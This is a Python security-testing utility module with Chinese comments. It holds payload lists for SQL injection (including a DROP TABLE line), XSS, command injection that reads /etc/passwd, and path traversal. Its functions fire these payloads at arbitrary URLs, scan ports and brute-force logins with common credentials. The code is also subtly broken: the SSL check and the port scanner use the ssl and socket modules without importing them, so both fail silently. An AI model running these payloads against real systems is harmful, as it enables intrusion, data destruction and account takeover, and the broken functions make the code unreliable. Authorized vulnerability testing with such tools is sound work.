#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
安全测试工具类

提供安全测试中常用的工具函数和类
"""

import requests
import hashlib
import base64
import json
import re
import time
import random
import string
from urllib.parse import urljoin, urlparse
import logging

logger = logging.getLogger(__name__)

class SecurityTestUtils:
    """安全测试工具类"""
    
    @staticmethod
    def generate_test_payloads():
        """生成测试载荷"""
        return {
            'sql_injection': [
                "' OR '1'='1",
                "' OR 1=1--",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM users--",
                "' OR '1'='1' AND '1'='1",
                "1' OR '1'='1",
                "admin'--",
                "admin'/*",
                "' OR 1=1#",
                "') OR ('1'='1"
            ],
            'xss_payloads': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>"
            ],
            'command_injection': [
                "; ls -la",
                "| whoami",
                "& dir",
                "` id `",
                "$(id)",
                "; cat /etc/passwd",
                "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "` cat /etc/passwd `",
                "$(cat /etc/passwd)",
                "; uname -a"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
            ]
        }
    
    @staticmethod
    def generate_weak_passwords():
        """生成弱密码列表"""
        return [
            '123456', 'password', 'admin', 'root', '12345678',
            'qwerty', 'abc123', 'password123', 'admin123',
            '1234567890', 'letmein', 'welcome', 'monkey',
            '123456789', 'qwertyuiop', '1234567890',
            'password1', '123123', 'admin123456'
        ]
    
    @staticmethod
    def generate_common_usernames():
        """生成常见用户名列表"""
        return [
            'admin', 'root', 'user', 'test', 'guest', 'demo',
            'administrator', 'operator', 'camera', 'device',
            'system', 'service', 'api', 'web', 'app'
        ]
    
    @staticmethod
    def check_http_security_headers(response):
        """检查HTTP安全头"""
        required_headers = {
            'Strict-Transport-Security': 'HSTS头缺失',
            'X-Content-Type-Options': '内容类型嗅探防护缺失',
            'X-Frame-Options': '点击劫持防护缺失',
            'X-XSS-Protection': 'XSS防护缺失',
            'Content-Security-Policy': '内容安全策略缺失',
            'Referrer-Policy': '引用策略缺失'
        }
        
        missing_headers = []
        for header, description in required_headers.items():
            if header not in response.headers:
                missing_headers.append(description)
        
        return missing_headers
    
    @staticmethod
    def detect_sensitive_data(text):
        """检测敏感数据"""
        patterns = {
            'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            'phone': r'(\+?86)?1[3-9]\d{9}|\d{3,4}-\d{7,8}',
            'id_card': r'\d{17}[\dXx]|\d{15}',
            'credit_card': r'\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}',
            'password': r'password["\']?\s*[:=]\s*["\']?[^"\'\s]+["\']?',
            'token': r'token["\']?\s*[:=]\s*["\']?[A-Za-z0-9+/=]+["\']?',
            'api_key': r'api[_-]?key["\']?\s*[:=]\s*["\']?[A-Za-z0-9+/=]+["\']?',
            'secret': r'secret["\']?\s*[:=]\s*["\']?[A-Za-z0-9+/=]+["\']?',
            'ip_address': r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b',
            'mac_address': r'\b([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})\b'
        }
        
        detected = {}
        for data_type, pattern in patterns.items():
            matches = re.findall(pattern, text, re.IGNORECASE)
            if matches:
                detected[data_type] = matches
        
        return detected
    
    @staticmethod
    def test_sql_injection(url, params=None, headers=None):
        """测试SQL注入"""
        payloads = SecurityTestUtils.generate_test_payloads()['sql_injection']
        vulnerabilities = []
        
        for param_name, param_value in (params or {}).items():
            for payload in payloads:
                try:
                    test_params = {param_name: payload}
                    response = requests.get(url, params=test_params, headers=headers, timeout=10)
                    
                    # 检查SQL错误信息
                    error_patterns = [
                        r'mysql_fetch_array',
                        r'ORA-\d+',
                        r'Microsoft.*ODBC.*SQL Server',
                        r'SQLServer JDBC Driver',
                        r'PostgreSQL.*ERROR',
                        r'Warning.*mysql_',
                        r'valid MySQL result',
                        r'MySqlClient\.',
                        r'SQL syntax.*MySQL',
                        r'Warning.*pg_',
                        r'valid PostgreSQL result'
                    ]
                    
                    for pattern in error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vulnerabilities.append({
                                'param': param_name,
                                'payload': payload,
                                'error': pattern
                            })
                            break
                
                except Exception as e:
                    logger.debug(f"SQL注入测试异常: {e}")
        
        return vulnerabilities
    
    @staticmethod
    def test_xss(url, params=None, headers=None):
        """测试XSS"""
        payloads = SecurityTestUtils.generate_test_payloads()['xss_payloads']
        vulnerabilities = []
        
        for param_name, param_value in (params or {}).items():
            for payload in payloads:
                try:
                    test_params = {param_name: payload}
                    response = requests.get(url, params=test_params, headers=headers, timeout=10)
                    
                    # 检查响应中是否包含未转义的脚本
                    if payload in response.text:
                        vulnerabilities.append({
                            'param': param_name,
                            'payload': payload
                        })
                
                except Exception as e:
                    logger.debug(f"XSS测试异常: {e}")
        
        return vulnerabilities
    
    @staticmethod
    def test_command_injection(url, params=None, headers=None):
        """测试命令注入"""
        payloads = SecurityTestUtils.generate_test_payloads()['command_injection']
        vulnerabilities = []
        
        for param_name, param_value in (params or {}).items():
            for payload in payloads:
                try:
                    test_params = {param_name: payload}
                    response = requests.get(url, params=test_params, headers=headers, timeout=10)
                    
                    # 检查命令执行结果
                    command_results = [
                        'uid=', 'gid=', 'groups=',
                        'root:', 'bin:', 'daemon:',
                        'total ', 'drwx', '-rw-',
                        'Microsoft Windows', 'Volume in drive'
                    ]
                    
                    for result in command_results:
                        if result in response.text:
                            vulnerabilities.append({
                                'param': param_name,
                                'payload': payload,
                                'result': result
                            })
                            break
                
                except Exception as e:
                    logger.debug(f"命令注入测试异常: {e}")
        
        return vulnerabilities
    
    @staticmethod
    def test_path_traversal(url, params=None, headers=None):
        """测试路径遍历"""
        payloads = SecurityTestUtils.generate_test_payloads()['path_traversal']
        vulnerabilities = []
        
        for param_name, param_value in (params or {}).items():
            for payload in payloads:
                try:
                    test_params = {param_name: payload}
                    response = requests.get(url, params=test_params, headers=headers, timeout=10)
                    
                    # 检查是否成功读取系统文件
                    system_files = [
                        'root:', 'bin:', 'daemon:',
                        '127.0.0.1', 'localhost',
                        'Microsoft Windows', 'Volume in drive'
                    ]
                    
                    for file_content in system_files:
                        if file_content in response.text:
                            vulnerabilities.append({
                                'param': param_name,
                                'payload': payload,
                                'file_content': file_content
                            })
                            break
                
                except Exception as e:
                    logger.debug(f"路径遍历测试异常: {e}")
        
        return vulnerabilities
    
    @staticmethod
    def generate_random_string(length=10):
        """生成随机字符串"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    @staticmethod
    def generate_test_data():
        """生成测试数据"""
        return {
            'username': SecurityTestUtils.generate_random_string(8),
            'password': SecurityTestUtils.generate_random_string(12),
            'email': f"{SecurityTestUtils.generate_random_string(8)}@example.com",
            'phone': f"1{random.randint(3000000000, 9999999999)}",
            'id_card': f"{random.randint(100000000000000000, 999999999999999999)}"
        }
    
    @staticmethod
    def check_ssl_certificate(host, port=443):
        """检查SSL证书"""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((host, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()
                    
                    return {
                        'certificate': cert,
                        'cipher': cipher,
                        'version': version,
                        'valid': True
                    }
        except Exception as e:
            return {
                'error': str(e),
                'valid': False
            }
    
    @staticmethod
    def scan_ports(host, ports):
        """扫描端口"""
        open_ports = []
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                result = sock.connect_ex((host, port))
                sock.close()
                
                if result == 0:
                    open_ports.append(port)
            except Exception as e:
                logger.debug(f"端口扫描异常 {port}: {e}")
        
        return open_ports
    
    @staticmethod
    def test_brute_force(login_url, usernames, passwords, max_attempts=10):
        """测试暴力破解防护"""
        attempts = 0
        lockout_detected = False
        
        for username in usernames:
            for password in passwords:
                if attempts >= max_attempts:
                    break
                
                try:
                    login_data = {'username': username, 'password': password}
                    response = requests.post(login_url, json=login_data, timeout=5)
                    
                    if response.status_code == 429:  # Too Many Requests
                        lockout_detected = True
                        break
                    elif response.status_code == 200:
                        return {
                            'success': True,
                            'username': username,
                            'password': password
                        }
                    
                    attempts += 1
                    time.sleep(0.1)  # 短暂延迟
                
                except Exception as e:
                    logger.debug(f"暴力破解测试异常: {e}")
        
        return {
            'success': False,
            'lockout_detected': lockout_detected,
            'attempts': attempts
        }
    
    @staticmethod
    def generate_security_report(violations, test_type="Security Test"):
        """生成安全测试报告"""
        total_violations = len(violations)
        critical_violations = len([v for v in violations if v.get('severity') == 'CRITICAL'])
        high_violations = len([v for v in violations if v.get('severity') == 'HIGH'])
        medium_violations = len([v for v in violations if v.get('severity') == 'MEDIUM'])
        
        report = f"""
{test_type}报告
================

测试时间: {time.strftime('%Y-%m-%d %H:%M:%S')}

安全违规统计:
- 总计: {total_violations}
- 严重: {critical_violations}
- 高危: {high_violations}
- 中危: {medium_violations}

详细违规列表:
"""
        
        for violation in violations:
            severity = violation.get('severity', 'UNKNOWN')
            test_name = violation.get('test', 'Unknown Test')
            description = violation.get('description', 'No description')
            report += f"- [{severity}] {test_name}: {description}\n"
        
        return report


